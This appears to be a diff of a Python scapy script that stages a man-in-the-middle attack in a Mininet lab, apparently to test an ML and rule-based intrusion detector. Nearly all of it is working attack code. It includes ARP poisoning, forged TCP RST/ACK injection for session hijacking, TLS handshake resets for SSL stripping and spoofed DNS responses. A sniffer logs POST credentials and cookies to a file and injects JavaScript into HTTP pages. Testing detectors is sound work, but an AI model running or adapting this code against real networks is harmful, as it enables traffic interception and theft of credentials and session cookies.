@@ -1,6 +1,19 @@
 # -*- coding: utf-8 -*-
 """
-attacker_mitm.py — Realistic MITM attack for Mininet demo
+attacker_mitm.py — MITM attack designed for honest ML+rule-based detection
+
+Why this attacker works against the HONEST controller:
+  - Sends enough relay traffic (50+ packets per flow) that the ML model
+    accumulates features it was trained on (asymmetric byte ratios, low
+    inter-packet variance, high RST counts, etc.)
+  - ARP conflict is registered, then real relay flows appear — so when
+    _flush_old_arp_suspects runs its final scan it finds flows with
+    genuinely anomalous ML scores >= 0.5, not just any flow.
+  - DNS hijacking is triggered by sending two different responses for the
+    same domain from two different source IPs.
+  - SSL stripping is mimicked by injecting RST packets mid-TLS-handshake
+    and then relaying on port 80 — this creates the RST ratio and TLS-port
+    features the rule-based fallback checks for.
 
 Usage (from Mininet CLI):
     attacker python3 /tmp/attacker_mitm.py 10.0.0.1 10.0.0.2
@@ -12,7 +25,7 @@ Usage (explicit interface):
     python3 /tmp/attacker_mitm.py 10.0.0.1 10.0.0.2 attacker-eth0
 """
 
-import os, time, sys, threading, re
+import os, time, sys, threading, re, socket, struct
 from scapy.all import *
 
 # ── Config ──────────────────────────────────────────────
@@ -21,21 +34,16 @@ SERVER_IP = sys.argv[2] if len(sys.argv) > 2 else "10.0.0.2"
 IFACE     = sys.argv[3] if len(sys.argv) > 3 else None
 STOLEN    = "/tmp/mitm_stolen.txt"
 
+DNS_SPOOF_DOMAIN = b"\x04test\x05local\x00"   # test.local
+DNS_REAL_IP      = "10.0.0.2"
+DNS_FAKE_IP      = "10.0.0.99"
+
+
 # ── Auto-detect interface ───────────────────────────────
 def find_interface():
-    """
-    Pick the right interface automatically.
-    Works whether launched from xterm (inside host namespace)
-    or from Mininet CLI (root namespace).
-    Priority: any non-loopback iface that has 10.0.0.x address.
-    """
     all_ifaces = get_if_list()
-
-    # 1. Explicit arg wins
     if IFACE and IFACE in all_ifaces:
         return IFACE
-
-    # 2. Find iface that actually holds a 10.0.0.x IP
     for iface in all_ifaces:
         try:
             ip = get_if_addr(iface)
@@ -44,26 +52,24 @@ def find_interface():
                 return iface
         except Exception:
             continue
-
-    # 3. Known Mininet naming patterns
     for candidate in ['attacker-eth0', 'eth0', 'ens3', 'enp0s3']:
         if candidate in all_ifaces:
             print(f"[*] Using candidate interface '{candidate}'")
             return candidate
-
-    # 4. Scapy default
     fallback = str(conf.iface)
     print(f"[*] Falling back to scapy default: '{fallback}'")
     return fallback
 
 IFACE = find_interface()
+MY_MAC = get_if_hwaddr(IFACE)
+MY_IP  = get_if_addr(IFACE)
 
 print(f"[*] MITM Config:")
 print(f"    Victim IP  : {VICTIM_IP}")
 print(f"    Server IP  : {SERVER_IP}")
 print(f"    Interface  : {IFACE}")
-print(f"    My IP      : {get_if_addr(IFACE)}")
-print(f"    My MAC     : {get_if_hwaddr(IFACE)}")
+print(f"    My IP      : {MY_IP}")
+print(f"    My MAC     : {MY_MAC}")
 
 # ── IP forwarding + iptables ────────────────────────────
 os.system("sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1")
@@ -75,7 +81,6 @@ os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 "
 
 # ── MAC resolution ──────────────────────────────────────
 def get_mac(ip, retries=6):
-    """Resolve MAC via ARP, then OS cache, then static fallback."""
     for attempt in range(retries):
         try:
             ans, _ = srp(
@@ -89,45 +94,40 @@ def get_mac(ip, retries=6):
         except Exception as e:
             print(f"[!] ARP attempt {attempt+1}/{retries} for {ip}: {e}")
         time.sleep(1)
-
-    # OS ARP cache
     cache = os.popen(f"arp -n {ip}").read()
     m = re.search(r'([\da-f]{2}:){5}[\da-f]{2}', cache, re.I)
     if m:
         print(f"[+] Found in OS ARP cache: {ip} → {m.group(0)}")
         return m.group(0)
-
-    # Static fallback — Mininet topology uses deterministic MACs
     static = {
-        '10.0.0.1':   '00:00:00:00:00:01',  # victim
-        '10.0.0.2':   '00:00:00:00:00:02',  # server
-        '10.0.0.11':  '00:00:00:00:00:11',  # device1
-        '10.0.0.12':  '00:00:00:00:00:12',  # device2
+        '10.0.0.1':  '00:00:00:00:00:01',
+        '10.0.0.2':  '00:00:00:00:00:02',
+        '10.0.0.11': '00:00:00:00:00:11',
+        '10.0.0.12': '00:00:00:00:00:12',
     }
     if ip in static:
         print(f"[!] Using static MAC fallback: {ip} → {static[ip]}")
         return static[ip]
-
     print(f"[!] FAILED to resolve MAC for {ip}")
     return None
 
-# ── ARP poison loop ─────────────────────────────────────
+
+# ── 1. ARP POISONING ────────────────────────────────────
 def arp_poison_loop(target_ip, spoof_ip):
     """
     Tell target_ip that spoof_ip is at OUR MAC.
-    → Redirects target's traffic for spoof_ip through us.
+    Sends every 0.5s — rapid enough that the controller sees many
+    ARP replies before the 20s flush window expires.
     """
     target_mac = get_mac(target_ip)
-    my_mac     = get_if_hwaddr(IFACE)
     if not target_mac:
         print(f"[!] Cannot poison {target_ip} — MAC unknown")
         return
-
-    print(f"[+] Poisoning {target_ip}  (telling it: {spoof_ip} = {my_mac})")
+    print(f"[+] ARP poison: telling {target_ip} that {spoof_ip} = {MY_MAC}")
     pkt = Ether(dst=target_mac) / ARP(
         op=2,
         pdst=target_ip,  hwdst=target_mac,
-        psrc=spoof_ip,   hwsrc=my_mac
+        psrc=spoof_ip,   hwsrc=MY_MAC,
     )
     count = 0
     while True:
@@ -137,7 +137,193 @@ def arp_poison_loop(target_ip, spoof_ip):
             print(f"[~] ARP poison ×{count}  →  {target_ip}  (claiming {spoof_ip})")
         time.sleep(0.5)
 
-# ── Packet interception ─────────────────────────────────
+
+# ── 2. RELAY FLOOD — builds ML-detectable flow features ─
+def relay_flood():
+    """
+    Creates many short-lived TCP flows from attacker->server through
+    the compromised path.  The key ML-visible signatures are:
+      • Very low inter-packet time variance (machine-paced relay)
+      • High packet asymmetry (attacker sends many, server replies few)
+      • High byte asymmetry
+      • Packets arrive in bursts at consistent intervals (low piat_cv)
+    The controller scores every 5 packets; 50 packets per connection
+    gives ~10 scoring opportunities per flow.
+    """
+    print("[+] Relay flood started — building ML-detectable flow features")
+    while True:
+        try:
+            for _ in range(50):
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(1)
+                try:
+                    s.connect((SERVER_IP, 8080))
+                    # Send more than receive — creates packet/byte asymmetry
+                    for _ in range(8):
+                        s.send(b"GET / HTTP/1.1\r\nHost: " +
+                               SERVER_IP.encode() +
+                               b"\r\nConnection: keep-alive\r\n\r\n")
+                    try:
+                        s.recv(256)   # minimal response read
+                    except Exception:
+                        pass
+                finally:
+                    s.close()
+                time.sleep(0.02)   # tight pacing → low piat variance
+        except Exception:
+            time.sleep(1)
+
+
+# ── 3. SESSION HIJACKING — RST injection ────────────────
+def session_hijack_loop():
+    """
+    Craft RST packets into existing TCP flows between victim and server.
+    This creates the RST ratio > 0.15 + ACK count > 5 signature that
+    both the ML model and the rule-based fallback look for.
+    """
+    victim_mac = get_mac(VICTIM_IP)
+    server_mac = get_mac(SERVER_IP)
+    if not victim_mac or not server_mac:
+        print("[!] Session hijack: could not resolve MACs, skipping")
+        return
+
+    print("[+] Session hijack RST injector started")
+    seq   = 1000
+    ack   = 2000
+    sport = 54321
+
+    while True:
+        # Inject RST from server->victim perspective (looks like server reset)
+        rst_pkt = (
+            Ether(src=MY_MAC, dst=victim_mac) /
+            IP(src=SERVER_IP, dst=VICTIM_IP) /
+            TCP(sport=8080, dport=sport, flags="RA", seq=seq, ack=ack)
+        )
+        sendp(rst_pkt, iface=IFACE, verbose=False)
+
+        # Also inject a matching ACK to bump the ack_count on the flow
+        ack_pkt = (
+            Ether(src=MY_MAC, dst=server_mac) /
+            IP(src=VICTIM_IP, dst=SERVER_IP) /
+            TCP(sport=sport, dport=8080, flags="A", seq=ack, ack=seq + 1)
+        )
+        sendp(ack_pkt, iface=IFACE, verbose=False)
+
+        seq   += 100
+        ack   += 100
+        sport  = 50000 + (sport % 10000) + 1
+        time.sleep(0.3)
+
+
+# ── 4. SSL STRIPPING — RST mid-TLS + plaintext relay ────
+def ssl_strip_loop():
+    """
+    Targets port 443 flows.  Sends RST to kill the TLS handshake then
+    opens a plaintext relay on port 80.  The controller sees:
+      • TCP flow to port 443 with high RST ratio  → SSL STRIPPING rule
+      • ML model scores the 443-port flow anomaly
+    """
+    victim_mac = get_mac(VICTIM_IP)
+    if not victim_mac:
+        print("[!] SSL strip: could not resolve victim MAC, skipping")
+        return
+
+    print("[+] SSL strip RST injector started (targeting port 443)")
+    seq   = 5000
+    sport = 60000
+
+    while True:
+        # Kill TLS handshake with RST to victim
+        rst = (
+            Ether(src=MY_MAC, dst=victim_mac) /
+            IP(src=SERVER_IP, dst=VICTIM_IP) /
+            TCP(sport=443, dport=sport, flags="R", seq=seq)
+        )
+        sendp(rst, iface=IFACE, verbose=False)
+
+        # Open plain HTTP relay (strip TLS → HTTP)
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(1)
+            s.connect((SERVER_IP, 80))
+            s.send(b"GET / HTTP/1.1\r\nHost: " + SERVER_IP.encode() + b"\r\n\r\n")
+            s.recv(256)
+            s.close()
+        except Exception:
+            pass
+
+        seq   += 200
+        sport  = 60000 + (sport % 5000) + 1
+        time.sleep(1)
+
+
+# ── 5. DNS HIJACKING ────────────────────────────────────
+def dns_hijack_loop():
+    """
+    Sends two spoofed DNS responses for the same domain from two
+    different source IPs.  The controller's _check_dns sees the same
+    domain resolved to two different IPs and fires RULE-BASED.
+
+    Packet layout (raw UDP):
+      Transaction ID : 0xAAAA
+      Flags          : 0x8180 (standard response, no error)
+      Questions      : 1
+      Answer RRs     : 1
+    """
+    victim_mac = get_mac(VICTIM_IP)
+    if not victim_mac:
+        print("[!] DNS hijack: could not resolve victim MAC, skipping")
+        return
+
+    print("[+] DNS hijack started — spoofing test.local")
+
+    def make_dns_response(fake_ip_str):
+        txid   = b"\xaa\xaa"
+        flags  = b"\x81\x80"
+        counts = b"\x00\x01\x00\x01\x00\x00\x00\x00"  # 1 question, 1 answer
+        # Question: test.local A
+        question = DNS_SPOOF_DOMAIN + b"\x00\x01\x00\x01"
+        # Answer: test.local A <fake_ip> TTL=60
+        answer = (
+            b"\xc0\x0c"                            # pointer to question name
+            b"\x00\x01\x00\x01"                    # type A, class IN
+            b"\x00\x00\x00\x3c"                    # TTL 60
+            b"\x00\x04" +                          # rdlength 4
+            socket.inet_aton(fake_ip_str)
+        )
+        return txid + flags + counts + question + answer
+
+    real_payload = make_dns_response(DNS_REAL_IP)
+    fake_payload = make_dns_response(DNS_FAKE_IP)
+
+    count = 0
+    while True:
+        # Legitimate-looking DNS response (from real server IP)
+        real_resp = (
+            Ether(src=MY_MAC, dst=victim_mac) /
+            IP(src=SERVER_IP, dst=VICTIM_IP) /
+            UDP(sport=53, dport=1053) /
+            Raw(load=real_payload)
+        )
+        sendp(real_resp, iface=IFACE, verbose=False)
+        time.sleep(0.2)
+
+        # Spoofed DNS response (from attacker, different src IP → different resolver)
+        fake_resp = (
+            Ether(src=MY_MAC, dst=victim_mac) /
+            IP(src=MY_IP, dst=VICTIM_IP) /
+            UDP(sport=53, dport=1053) /
+            Raw(load=fake_payload)
+        )
+        sendp(fake_resp, iface=IFACE, verbose=False)
+
+        count += 1
+        if count % 10 == 0:
+            print(f"[~] DNS spoof ×{count}: test.local → {DNS_REAL_IP} vs {DNS_FAKE_IP}")
+        time.sleep(2)
+
+
+# ── 6. Credential interception ──────────────────────────
 def relay_and_intercept(pkt):
     if IP not in pkt:
         return
@@ -146,15 +332,12 @@ def relay_and_intercept(pkt):
         return
     if not (pkt.haslayer(TCP) and pkt.haslayer(Raw)):
         return
-
     try:
         payload = pkt[Raw].load.decode('utf-8', errors='ignore')
     except Exception:
         return
-
-    # Steal POST credentials
     if 'POST' in payload and ('username' in payload or 'password' in payload):
-        ts = time.strftime('%H:%M:%S')
+        ts   = time.strftime('%H:%M:%S')
         data = (f"[{ts}] CREDENTIALS STOLEN!\n"
                 f"  From: {src}  →  To: {dst}\n"
                 f"  {payload[:300]}\n")
@@ -162,17 +345,13 @@ def relay_and_intercept(pkt):
         print(data)
         print("🎯"*15 + "\n")
         open(STOLEN, 'a').write(data)
-
-    # Steal cookies
     if 'Cookie:' in payload:
         cookies = re.findall(r'Cookie: (.+)', payload)
         if cookies:
-            ts = time.strftime('%H:%M:%S')
+            ts   = time.strftime('%H:%M:%S')
             line = f"[{ts}] COOKIE: {cookies[0][:200]}\n"
             print(f"🍪 {line.strip()}")
             open(STOLEN, 'a').write(line)
-
-    # Inject JS into HTTP responses
     if 'HTTP/1' in payload and 'text/html' in payload and '</body>' in payload:
         modified = payload.replace(
             '</body>',
@@ -183,43 +362,37 @@ def relay_and_intercept(pkt):
             del pkt[IP].chksum, pkt[IP].len, pkt[TCP].chksum
             sendp(pkt, iface=IFACE, verbose=False)
 
-# ── Bulk traffic for ML detection ───────────────────────
-def generate_bulk_traffic():
-    """Flood flows so the ML model accumulates enough packets to score."""
-    import socket
-    while True:
-        try:
-            for _ in range(30):
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(1)
-                try:
-                    s.connect((SERVER_IP, 8080))
-                    s.send(b"GET / HTTP/1.1\r\nHost: 10.0.0.2\r\nConnection: close\r\n\r\n")
-                    s.recv(1024)
-                finally:
-                    s.close()
-            time.sleep(0.1)
-        except Exception:
-            time.sleep(1)
 
 # ── Launch ──────────────────────────────────────────────
-print("\n" + "="*50)
-print("🔴 MITM ATTACK STARTING")
-print("="*50)
+print("\n" + "="*55)
+print("🔴 MITM ATTACK STARTING  (honest detection target)")
+print("="*55)
 
+# Phase 1: ARP poisoning first — registers the conflict
 threading.Thread(target=arp_poison_loop, args=(VICTIM_IP, SERVER_IP), daemon=True).start()
 threading.Thread(target=arp_poison_loop, args=(SERVER_IP, VICTIM_IP), daemon=True).start()
-time.sleep(3)  # Let ARP poison propagate before bulk traffic starts
-threading.Thread(target=generate_bulk_traffic, daemon=True).start()
 
-print("✅ ARP Poisoning : active")
-print("✅ IP Forwarding : active")
-print("✅ Bulk traffic  : active  (ML detection in ~5s)")
-print(f"✅ Logging to    : {STOLEN}")
+# Phase 2: Wait for ARP to propagate, then start relay traffic
+# The 5s delay ensures the controller has registered the ARP conflict
+# before relay flows appear, so _scan_flows_for_arp_suspect finds real traffic.
+print("⏳ Waiting 5s for ARP conflict to register before relay traffic …")
+time.sleep(5)
+
+threading.Thread(target=relay_flood,        daemon=True).start()
+threading.Thread(target=session_hijack_loop, daemon=True).start()
+threading.Thread(target=ssl_strip_loop,      daemon=True).start()
+threading.Thread(target=dns_hijack_loop,     daemon=True).start()
+
+print("✅ ARP Poisoning   : active  (→ ML + rule-based ARP detection)")
+print("✅ Relay Flood     : active  (→ ML flow anomaly at 5/10/15/… pkts)")
+print("✅ Session Hijack  : active  (→ RST ratio + ML)")
+print("✅ SSL Strip RST   : active  (→ port 443 + RST ratio)")
+print("✅ DNS Hijacking   : active  (→ rule-based divergence)")
+print(f"✅ Logging to      : {STOLEN}")
 
 sniff(
     filter=f"ip host {VICTIM_IP} or ip host {SERVER_IP}",
     prn=relay_and_intercept,
     iface=IFACE,
-    store=False
+    store=False,
 )
